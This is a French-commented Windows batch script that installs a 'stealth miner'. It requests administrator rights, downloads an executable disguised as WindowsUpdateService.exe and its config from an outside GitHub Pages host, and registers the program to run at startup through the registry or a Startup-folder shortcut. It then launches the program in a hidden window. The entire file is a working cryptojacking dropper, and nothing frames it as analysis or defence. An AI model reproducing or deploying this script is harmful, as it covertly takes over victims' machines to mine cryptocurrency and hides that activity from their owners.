@echo off
:: ===============================
:: Script d'installation pour mineur furtif
:: ===============================

:: Définit l'encodage en UTF-8 pour les caractères spéciaux
chcp 65001 >nul

:: Vérifie les droits administratifs
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Ce script nécessite des droits administratifs. Relancement... 
    powershell -Command "Start-Process -FilePath '%~0' -Verb RunAs"
    exit /b
)

:: Variables
set LOGFILE=%TEMP%\miner_install_log.txt
set MINER_URL=https://outof-ctrl.github.io/Outof-repo/WindowsUpdateService.exe
set CONFIG_URL=https://outof-ctrl.github.io/Outof-repo/config.json
set MINER_PATH=%APPDATA%\WinUS
set MINER_EXEC=WindowsUpdateService.exe
set MINER_CONFIG=config.json

:: Journalisation
echo [INFO] Début de l'installation > "%LOGFILE%"
echo [INFO] Vérification des droits administratifs... >> "%LOGFILE%"

:: Crée le répertoire de destination
if not exist "%MINER_PATH%" (
    mkdir "%MINER_PATH%"
    echo [INFO] Répertoire %MINER_PATH% créé. >> "%LOGFILE%"
) else (
    echo [INFO] Répertoire %MINER_PATH% existe déjà. >> "%LOGFILE%"
)

:: Télécharge le mineur furtif
echo [INFO] Téléchargement du mineur... >> "%LOGFILE%"
curl -o "%MINER_PATH%\%MINER_EXEC%" %MINER_URL% >> "%LOGFILE%" 2>&1
if not exist "%MINER_PATH%\%MINER_EXEC%" (
    echo [ERREUR] Échec du téléchargement du mineur. >> "%LOGFILE%"
    exit /b
)

:: Télécharge le fichier de configuration
echo [INFO] Téléchargement du fichier de configuration... >> "%LOGFILE%"
curl -o "%MINER_PATH%\%MINER_CONFIG%" %CONFIG_URL% >> "%LOGFILE%" 2>&1
if not exist "%MINER_PATH%\%MINER_CONFIG%" (
    echo [ERREUR] Échec du téléchargement du fichier de configuration. >> "%LOGFILE%"
    exit /b
)

:: Ajoute le mineur au démarrage via le registre
echo [INFO] Ajout du mineur au démarrage via le registre... >> "%LOGFILE%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "\"%MINER_PATH%\%MINER_EXEC%\" --config %MINER_PATH%\%MINER_CONFIG%" /f >> "%LOGFILE%" 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Impossible d'ajouter le mineur au démarrage via le registre. >> "%LOGFILE%"
)

:: Alternative : Ajout au dossier Startup en cas d'échec du registre
if %errorlevel% neq 0 (
    echo [INFO] Ajout au dossier Startup comme alternative... >> "%LOGFILE%"
    set SHORTCUT_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateService.lnk
    powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%SHORTCUT_PATH%'); $Shortcut.TargetPath = '%MINER_PATH%\%MINER_EXEC%'; $Shortcut.Arguments = '--config %MINER_PATH%\%MINER_CONFIG%'; $Shortcut.Save()"
    if exist "%SHORTCUT_PATH%" (
        echo [SUCCES] Raccourci créé dans Startup. >> "%LOGFILE%"
    ) else (
        echo [ERREUR] Échec de la création du raccourci dans Startup. >> "%LOGFILE%"
    )
)

:: Lancement furtif du mineur
echo [INFO] Lancement du mineur en mode furtif... >> "%LOGFILE%"
powershell -WindowStyle Hidden -Command "Start-Process '%MINER_PATH%\%MINER_EXEC%' -ArgumentList '--config %MINER_PATH%\%MINER_CONFIG%' -WindowStyle Hidden" >> "%LOGFILE%" 2>&1

:: Vérifie si le mineur s'est lancé
tasklist | findstr /i "%MINER_EXEC%" >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Échec du lancement du mineur. >> "%LOGFILE%"
) else (
    echo [SUCCES] Mineur lancé avec succès. >> "%LOGFILE%"
)

:: Fin
echo [SUCCES] Installation terminée. >> "%LOGFILE%"
exit /b
